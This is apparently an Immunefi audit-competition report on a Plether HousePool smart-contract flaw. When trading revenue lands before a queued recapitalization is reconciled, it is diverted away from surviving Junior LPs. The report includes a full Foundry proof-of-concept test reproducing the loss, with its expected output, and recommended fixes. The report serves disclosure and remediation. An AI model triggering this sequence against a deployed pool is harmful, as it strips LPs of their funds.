# \#98743 [SC-High] Trading revenue that lands before a queued recapitalization is reconciled is taken from surviving Junior LPs

**Submitted on Nov 9th 2026 at 23:57:53 UTC by @Nescient for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98743
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

# Description

## Brief/Intro

After a loss wipes Junior principal and impairs Senior, governance restores Senior with `recapitalizePool`. That call only queues the recapitalization; it is allocated at the next reconciliation. Any trading revenue that arrives in between is not tagged as claimant revenue, because stored Senior principal is still nonzero. The next reconciliation therefore uses the revenue to restore Senior first, finds a smaller Senior gap for the recapitalization, and moves the leftover recapitalization into ownerless `unassignedAssets`.

The surviving Junior LPs lose the revenue that the documented recovery order gives them. In the PoC, a surviving Junior LP redeems 1,000.082965 USDG when the recapitalization is reconciled before the same losing trade, and 0 USDG when the trade lands first. The only way to move the stranded value is the owner's `assignUnassignedAssets`, which mints new bootstrap shares to a single receiver and dilutes the surviving Junior shares to zero.

## Vulnerability Details

### Revenue is tagged only when both stored principals are zero

`HousePool.recordClaimantInflow` queues every recapitalization, but queues revenue only when both stored tranche principals are zero:

```solidity
if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
    _recordPendingClaimantInflow(kind, amount);
} else if (seniorPrincipal + juniorPrincipal == 0) {
    _recordPendingClaimantInflow(kind, amount);
}
```

After a Junior wipe with Senior impaired, `juniorPrincipal == 0` but `seniorPrincipal > 0`. A losing close or liquidation in that state sends its loss to the pool as `Revenue` with `CashArrived`; `accountedAssets` increases, but `pendingTradingRevenueAssets` does not. The revenue becomes ordinary unreserved equity even though a recapitalization is still queued.

`CfdEngine.recapitalizePool` does not reconcile. `SECURITY.md` states that "The pool queues claimant allocation for normal reconciliation". So the queued recapitalization waits for the next committed reconciliation, which in the post-wipe state is an LP epoch settlement that makes queue progress (a settlement without progress reverts with `HousePool__NoLpEpochProgress`).

### The next reconciliation applies the revenue before the recapitalization

`HousePool._reconcile` passes only the queued buckets to `HousePoolReconcilePlanLib.planReconcile`. The planner reserves them and runs the ordinary waterfall on the rest:

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
...
if (plan.revenue) {
    plan.juniorPrincipalBeforeRevenue = plan.state.waterfall.juniorPrincipal;
    plan.state.waterfall =
        HousePoolWaterfallAccountingLib.distributeRevenue(plan.state.waterfall, plan.deltaAssets);
    return plan;
}
```

The untagged revenue is part of the unreserved surplus, so `distributeRevenue` uses it to restore Senior toward its high-water mark. Only afterwards does `_applyPendingClaimantBucketsLive` apply the queued recapitalization through `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent`:

```solidity
uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
    ? state.waterfall.seniorHighWaterMark - state.waterfall.seniorPrincipal
    : 0;
if (gap > 0) {
    uint256 seniorAssignedAssets = remaining > gap ? gap : remaining;
    state.waterfall.seniorPrincipal += seniorAssignedAssets;
    remaining -= seniorAssignedAssets;
}
...
if (remaining > 0) {
    state.unassignedAssets += remaining;
}
```

The revenue has already shrunk the gap, so the same amount of recapitalization becomes `unassignedAssets`. Junior principal stays zero.

### The result depends only on whether a reconciliation ran in between

| From the same post-wipe state | Recapitalization reconciled before the trade | Trade lands before reconciliation |
| --- | ---: | ---: |
| Senior gap restored by | 2,295.251970 recapitalization | 1,000.504994 revenue + 1,294.746976 recapitalization |
| Senior principal after reconciliation | 9,901.091972 (its high-water mark) | 9,901.091972 (its high-water mark) |
| Junior value after reconciliation | 1,000.504994 | 0 |
| `unassignedAssets` | 0 | 1,000.504994 |
| Surviving Junior LP redeems | 1,000.082965 USDG | 0 USDG |

The recapitalization, the losing trade, and the prices are identical in both branches. Only the reconciliation timing differs.

### This contradicts the documented ownership rules

- `ACCOUNTING_SPEC.md` ("Ownership Routing For Pool Inflows"): "source semantics decide the owner of the inflow" and "only value with no safe claimant path belongs in `unassignedAssets`". Surviving Junior shares are a safe claimant path, yet the revenue's value ends up in `unassignedAssets`.
- The project's reference invariant `test_Reachability_RecapitalizationRestoresSeniorAndReservesSurplusBeforeNewRevenue` pins the intended order: the recapitalization restores Senior and reserves only its own surplus, and later trading revenue becomes Junior principal ("recap surplus remains reserved through later trading revenue").
- The Cecuro fix for MED-12 states that recapitalization "remains senior-first" and that revenue in the same batch "follows the restored claimant ownership".

### Relation to the MED-12 fix

MED-12 concerned stored `S = J = 0`, with both the recapitalization and the revenue queued, and a stale `allowRevenueContinuation` flag. Its fix recomputes continuation inside the shared pending-bucket helper (`HousePool.sol:1576-1578`). Here stored Senior is nonzero, so the revenue is never queued and the repaired helper never sees it. This is a different path to the same class of outcome that the fix was meant to remove.

### Who can trigger it

Any losing close or liquidation between `recapitalizePool` and the next committed reconciliation triggers the misallocation, so ordinary trading is enough. An untrusted trader can also do it on purpose by closing a losing position in that window. The trader gains nothing: their loss is the same in both orderings. Governance's two calls (`recapitalizePool` and the later `assignUnassignedAssets`) are documented recovery actions. The loss to Junior is already visible in the pending preview before any owner assignment.

## Impact Details

- Surviving Junior LPs lose realized trading revenue up to the size of the Senior gap. In the PoC that is 1,000.504994 USDG of revenue, and the surviving Junior LP's payout falls from 1,000.082965 USDG to 0.
- The value moves to `unassignedAssets`, which blocks new LP entry until governance assigns it. `assignUnassignedAssets(false, receiver)` adds it to Junior principal and mints bootstrap shares to one receiver, priced so the surviving Junior shares are diluted to zero. In the PoC the configured seed receiver redeems 1,000.392011 USDG, and the surviving Junior LP's explicit-ID `claimRedeem` pays 0 and burns all of its shares.
- No party outside governance profits, so this maps to "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)".

## Recommendation

1. While a recapitalization is queued, record Revenue as a pending claimant inflow too (for example, extend the predicate at `HousePool.sol:646` with `|| pendingRecapitalizationAssets > 0`). The shared pending-bucket helper then applies the recapitalization first, and the revenue continues through the restored owners, as in the empty-principal case.
2. Alternatively, apply a queued recapitalization before the ordinary surplus waterfall in `planReconcile`.
3. Add a regression: the same recapitalization and the same later revenue must give surviving Junior LPs the same value whether or not a reconciliation runs between them.

## References

- [`HousePool.recordClaimantInflow`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L651)
- [`HousePool.assignUnassignedAssets`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L660-L704)
- [`HousePool._reconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1599)
- [`HousePool._emitLpEpochSettled` no-progress revert](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1179-L1185)
- [`HousePoolReconcilePlanLib.planReconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L47-L106)
- [`HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L137)
- [`CfdEngine.recapitalizePool`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632-L653)
- [`SECURITY.md` owner-funded recapitalization](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L155-L163)
- [`ACCOUNTING_SPEC.md` ownership routing for pool inflows](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L627-L650)
- [Reference invariant: recapitalization before new revenue](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/invariant/properties/PerpWaterfallReferenceInvariant.t.sol#L309-L322)
- [Cecuro AI audit report, MED-12](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)

## Proof of Concept

## Proof of Concept

The PoC uses only public entry points and documented owner recovery calls:

- V3 `commitOrder` and permissionless `executeOrder` for every trade;
- public asynchronous LP deposit, redemption, refund, and claim functions;
- permissionless Router `settleLpEpoch`;
- the release 40% skew limit, 1,000 USDG minimum open notional, and 40M / 80% Senior configuration;
- the owner's `recapitalizePool` and `assignUnassignedAssets`, both documented recovery actions.

Only Pyth and USDG are mocked. Every price update has its own increasing timestamp. The test snapshots one reachable post-wipe state and runs both orderings from it with the same recapitalization and the same losing trade.

Save the following file as `packages/perps/test/perps/regression/PendingRecapRevenuePriority.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {console2} from "forge-std/console2.sol";

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/// Pending recapitalization / later Revenue source-priority PoC.
///
/// Cheatcodes and test helpers used:
/// - MockSettlementToken.mint funds ordinary EOAs and the legitimate owner recapitalization; USDG is mockable.
/// - vm.prank/startPrank act only as ordinary LPs, traders, or a permissionless keeper.
/// - vm.warp advances only the real config delay, LP epochs, and one-hour deposit cooldown.
/// - vm.snapshotState/revertToState compares control and attack from identical reachable state.
/// - BasePerpTest._mockPythUpdateData supplies mocked signed prices through public Router entrypoints.
/// - BasePerpTest._fundTrader uses the public MarginClearinghouse deposit path.
/// - No vm.store, in-scope-contract impersonation, direct pool donation, or legacy Router entrypoint is used.
contract PendingRecapRevenuePriority is BasePerpTest {
    address internal constant JUNIOR_LP = address(0xC0401);
    address internal constant SENIOR_LP = address(0xC0402);
    address internal constant STRESS_TRADER = address(0xC0403);
    address internal constant REVENUE_TRADER = address(0xC0404);
    address internal constant LIQUIDITY_LP = address(0xC0405);
    address internal constant KEEPER = address(0xC0406);
    address internal constant SEED_RECEIVER = address(0xC0407);

    uint256 internal constant MID_PRICE = 1e8;
    uint256 internal constant JUNIOR_ASSETS = 2_500e6;
    uint256 internal constant SENIOR_ASSETS = 9_900e6;
    uint256 internal constant STRESS_SIZE = 4_800e18;
    uint256 internal constant STRESS_MARGIN = 250e6;
    uint256 internal constant REVENUE_SIZE = 1_000e18;
    uint256 internal constant REVENUE_MARGIN = 1_500e6;

    struct ControlResult {
        uint256 victimValue;
        uint256 victimPayout;
    }

    struct AttackResult {
        uint256 arrivedRevenue;
        uint256 victimValue;
        uint256 receiverValue;
        uint256 receiverPayout;
        uint256 victimPayout;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _juniorSeedReceiver() internal pure override returns (address) {
        return SEED_RECEIVER;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);

        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = 1_000e6;
        _setRouterConfig(config);
        vm.warp(vm.getBlockTimestamp() + 1 days); // Config delays end Sunday; continue in Monday live mode.
    }

    function test_PendingRecapLetsLaterTradingRevenueEscapeExistingJuniorOwners() public {
        _seedAndRealizeLoss();

        uint256 gap = pool.seniorHighWaterMark() - pool.seniorPrincipal();
        assertGt(gap, 1_000e6, "Senior gap must exceed the later $1,000 revenue");
        uint256 victimShares = juniorVault.balanceOf(JUNIOR_LP);
        assertGt(victimShares, 0);

        uint256 branchPoint = vm.snapshotState();
        ControlResult memory control = _runControl(gap, victimShares);

        assertTrue(vm.revertToState(branchPoint));
        AttackResult memory attack = _runAttack(gap, victimShares);

        assertGt(control.victimValue - attack.victimValue, 900e6, "over $900 of Junior yield is transferred");
        console2.log("exact Senior recap (atoms)", gap);
        console2.log("real trading revenue received (atoms)", attack.arrivedRevenue);
        console2.log("control existing-Junior value (atoms)", control.victimValue);
        console2.log("control victim USDG payout (atoms)", control.victimPayout);
        console2.log("attack existing-Junior value (atoms)", attack.victimValue);
        console2.log("bootstrap receiver value (atoms)", attack.receiverValue);
        console2.log("bootstrap receiver USDG payout (atoms)", attack.receiverPayout);
        console2.log("attack victim USDG payout (atoms)", attack.victimPayout);
    }

    function _runControl(
        uint256 gap,
        uint256 victimShares
    ) internal returns (ControlResult memory result) {
        // If the exact recap is reconciled first, the same later losing trade belongs to old Junior LPs.
        _recapitalize(gap);
        _persistPendingRecapWithRefund();
        uint256 poolBefore = pool.totalAssets();
        _createTradingRevenue();

        (, uint256 juniorRevenue) = pool.getPendingDepositTrancheState();
        result.victimValue = juniorVault.convertToAssets(victimShares);
        assertGt(pool.totalAssets() - poolBefore, 900e6, "control trade must create real Revenue");
        assertGt(juniorRevenue, 900e6, "control Revenue must accrue to Junior");
        assertGt(result.victimValue, 900e6, "old Junior LP must own control Revenue");

        // Correctly priced liquidity only satisfies the release 80% Senior redemption covenant.
        _publicDeposit(juniorVault, LIQUIDITY_LP, 3_000e6, CAP_PRICE);
        _finishCooldown(juniorVault, JUNIOR_LP);
        uint256 redeemId = _requestAllShares(juniorVault, JUNIOR_LP);
        _warpToEpoch(redeemId);
        _settleLpEpochAt(CAP_PRICE);
        uint256 walletBefore = settlementToken.balanceOf(JUNIOR_LP);
        result.victimPayout = _claimAllRedeem(juniorVault, redeemId, JUNIOR_LP);
        assertEq(settlementToken.balanceOf(JUNIOR_LP) - walletBefore, result.victimPayout);
        assertGt(result.victimPayout, 900e6, "control victim must receive Revenue in USDG");
    }

    function _runAttack(
        uint256 gap,
        uint256 victimShares
    ) internal returns (AttackResult memory result) {
        // The recap stays pending while an untrusted trader executes the same public losing trade.
        _recapitalize(gap);
        uint256 poolBefore = pool.totalAssets();
        _createTradingRevenue();
        (, uint256 previewJunior) = pool.getPendingDepositTrancheState();
        result.arrivedRevenue = pool.totalAssets() - poolBefore;

        assertEq(pool.pendingRecapitalizationAssets(), gap, "the exact recap remains queued");
        assertEq(pool.pendingTradingRevenueAssets(), 0, "stored Senior hides the Revenue source");
        assertEq(previewJunior, 0, "later Revenue leaves the old Junior claimant path");
        assertGt(result.arrivedRevenue, 900e6, "losing close must transfer about $1,000");

        // The owner follows the documented ownerless-asset path using the already configured seed receiver.
        assertEq(juniorVault.seedReceiver(), SEED_RECEIVER);
        uint256 receiverSharesBefore = juniorVault.balanceOf(SEED_RECEIVER);
        pool.assignUnassignedAssets(false, SEED_RECEIVER);
        uint256 receiverMintedShares = juniorVault.balanceOf(SEED_RECEIVER) - receiverSharesBefore;
        result.receiverValue = juniorVault.convertToAssets(receiverMintedShares);
        result.victimValue = juniorVault.convertToAssets(victimShares);
        assertEq(result.receiverValue, result.arrivedRevenue, "receiver gets every displaced Revenue atom");
        assertEq(pool.unassignedAssets(), 0, "assignment consumes the misclassified bucket");
        assertGt(result.receiverValue, 900e6, "bootstrap receiver captures claimant Revenue");
        assertEq(result.victimValue, 0, "old Junior LP shares lose all recovered value");

        // The same neutral liquidity makes the captured claim withdrawable. Receiver and victim redeem
        // in one epoch; only the bootstrap receiver receives USDG.
        _publicDeposit(juniorVault, LIQUIDITY_LP, 3_000e6, CAP_PRICE);
        _finishCooldown(juniorVault, SEED_RECEIVER);
        _finishCooldown(juniorVault, JUNIOR_LP);
        vm.prank(SEED_RECEIVER);
        uint256 redeemId = juniorVault.requestRedeem(receiverMintedShares, SEED_RECEIVER, SEED_RECEIVER);
        vm.prank(JUNIOR_LP);
        assertEq(juniorVault.requestRedeem(victimShares, JUNIOR_LP, JUNIOR_LP), redeemId);
        _warpToEpoch(redeemId);
        _settleLpEpochAt(CAP_PRICE);

        uint256 receiverWalletBefore = settlementToken.balanceOf(SEED_RECEIVER);
        uint256 receiverFundedShares = juniorVault.claimableRedeemRequest(redeemId, SEED_RECEIVER);
        vm.prank(SEED_RECEIVER);
        result.receiverPayout = juniorVault.claimRedeem(
            redeemId, receiverFundedShares, SEED_RECEIVER, SEED_RECEIVER
        );
        assertEq(settlementToken.balanceOf(SEED_RECEIVER) - receiverWalletBefore, result.receiverPayout);
        assertGt(result.receiverPayout, 900e6, "receiver must withdraw displaced Revenue");

        uint256 victimWalletBefore = settlementToken.balanceOf(JUNIOR_LP);
        uint256 victimFundedShares = juniorVault.claimableRedeemRequest(redeemId, JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        result.victimPayout = juniorVault.claimRedeem(redeemId, victimFundedShares, JUNIOR_LP, JUNIOR_LP);
        assertEq(settlementToken.balanceOf(JUNIOR_LP), victimWalletBefore, "victim receives zero USDG");
        assertEq(result.victimPayout, 0);
        assertEq(juniorVault.pendingRedeemRequest(redeemId, JUNIOR_LP), 0, "no later funded claim remains");
        assertEq(juniorVault.refundableRedeemRequest(redeemId, JUNIOR_LP), 0, "no share refund remains");
        assertEq(juniorVault.balanceOf(JUNIOR_LP), 0, "the documented redeem path consumed all victim shares");
    }

    function _seedAndRealizeLoss() internal {
        _publicDeposit(juniorVault, JUNIOR_LP, JUNIOR_ASSETS, MID_PRICE);
        _publicDeposit(seniorVault, SENIOR_LP, SENIOR_ASSETS, MID_PRICE);
        assertEq(pool.totalAssets(), JUNIOR_ASSETS + SENIOR_ASSETS + 2e6);

        _fundTrader(STRESS_TRADER, STRESS_MARGIN + 50e6);
        _executeV3(STRESS_TRADER, CfdTypes.Side.SHORT, STRESS_SIZE, STRESS_MARGIN, false, MID_PRICE);
        _executeV3(STRESS_TRADER, CfdTypes.Side.SHORT, STRESS_SIZE, 0, true, CAP_PRICE);

        // A zero-NAV Junior redemption gives the public settlement path legitimate queue progress.
        (uint256 wipeId,) = _requestAllJunior();
        _warpToEpoch(wipeId);
        _settleLpEpochAt(CAP_PRICE);
        _claimJuniorRefund(wipeId);
        assertEq(pool.juniorPrincipal(), 0);
        assertLt(pool.seniorPrincipal(), pool.seniorHighWaterMark());
    }

    function _persistPendingRecapWithRefund() internal {
        (uint256 requestId,) = _requestAllJunior();
        _warpToEpoch(requestId);
        _settleLpEpochAt(CAP_PRICE);
        _claimJuniorRefund(requestId);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark());
        assertEq(pool.juniorPrincipal(), 0);
    }

    function _createTradingRevenue() internal {
        _fundTrader(REVENUE_TRADER, REVENUE_MARGIN + 100e6);
        _executeV3(REVENUE_TRADER, CfdTypes.Side.LONG, REVENUE_SIZE, REVENUE_MARGIN, false, MID_PRICE);
        _executeV3(REVENUE_TRADER, CfdTypes.Side.LONG, REVENUE_SIZE, 0, true, CAP_PRICE);
    }

    function _recapitalize(
        uint256 assets
    ) internal {
        settlementToken.mint(address(this), assets);
        settlementToken.approve(address(engine), assets);
        engine.recapitalizePool(assets);
    }

    function _publicDeposit(
        TrancheVault vault,
        address lp,
        uint256 assets,
        uint256 markPrice
    ) internal {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        _warpToEpoch(requestId);
        _settleLpEpochAt(markPrice);
        uint256 claimableAssets = vault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        assertGt(vault.claimDeposit(requestId, claimableAssets, lp, lp), 0);
    }

    function _requestAllJunior() internal returns (uint256 requestId, uint256 shares) {
        _finishCooldown(juniorVault, JUNIOR_LP);
        shares = juniorVault.balanceOf(JUNIOR_LP);
        assertGt(shares, 0);
        vm.prank(JUNIOR_LP);
        requestId = juniorVault.requestRedeem(shares, JUNIOR_LP, JUNIOR_LP);
    }

    function _claimJuniorRefund(
        uint256 requestId
    ) internal {
        uint256 shares = juniorVault.refundableRedeemRequest(requestId, JUNIOR_LP);
        assertGt(shares, 0);
        vm.prank(JUNIOR_LP);
        assertEq(juniorVault.claimRedeemRefund(requestId, JUNIOR_LP, JUNIOR_LP), shares);
    }

    function _finishCooldown(
        TrancheVault vault,
        address lp
    ) internal {
        uint256 ready = vault.lastDepositTime(lp) + vault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < ready) {
            vm.warp(ready); // Ordinary one-hour deposit/refund/bootstrap cooldown.
        }
    }

    function _requestAllShares(
        TrancheVault vault,
        address lp
    ) internal returns (uint256 requestId) {
        uint256 shares = vault.balanceOf(lp);
        assertGt(shares, 0);
        vm.prank(lp);
        requestId = vault.requestRedeem(shares, lp, lp);
    }

    function _claimAllRedeem(
        TrancheVault vault,
        uint256 requestId,
        address lp
    ) internal returns (uint256 assets) {
        uint256 fundedShares = vault.claimableRedeemRequest(requestId, lp);
        assertGt(fundedShares, 0);
        assertEq(vault.pendingRedeemRequest(requestId, lp), 0);
        assertEq(vault.refundableRedeemRequest(requestId, lp), 0);
        vm.prank(lp);
        assets = vault.claimRedeem(requestId, fundedShares, lp, lp);
        assertGt(assets, 0);
    }

    function _executeV3(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 executionPrice
    ) internal returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()) + 0xC0400000);
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = executionPrice;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });

        vm.prank(account);
        orderId = router.commitOrder(request);
        bytes[] memory updateData = _mockPythUpdateData(executionPrice);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(result.orderId, orderId);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _settleLpEpochAt(
        uint256 price
    ) internal {
        bytes[] memory updateData = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(updateData);
    }

    function _warpToEpoch(
        uint256 requestId
    ) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < maturity) {
            vm.warp(maturity); // Ordinary asynchronous LP epoch maturity.
        }
    }
}
```

Run:

```sh
forge test --root packages/perps \
  --match-path test/perps/regression/PendingRecapRevenuePriority.t.sol -vv
```

Expected result:

```text
Ran 1 test for test/perps/regression/PendingRecapRevenuePriority.t.sol:PendingRecapRevenuePriority
[PASS] test_PendingRecapLetsLaterTradingRevenueEscapeExistingJuniorOwners()
Logs:
  exact Senior recap (atoms) 2295251970
  real trading revenue received (atoms) 1000504994
  control existing-Junior value (atoms) 1000105569
  control victim USDG payout (atoms) 1000082965
  attack existing-Junior value (atoms) 0
  bootstrap receiver value (atoms) 1000504994
  bootstrap receiver USDG payout (atoms) 1000392011
  attack victim USDG payout (atoms) 0

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

All logged values are USDG atoms with six decimals.

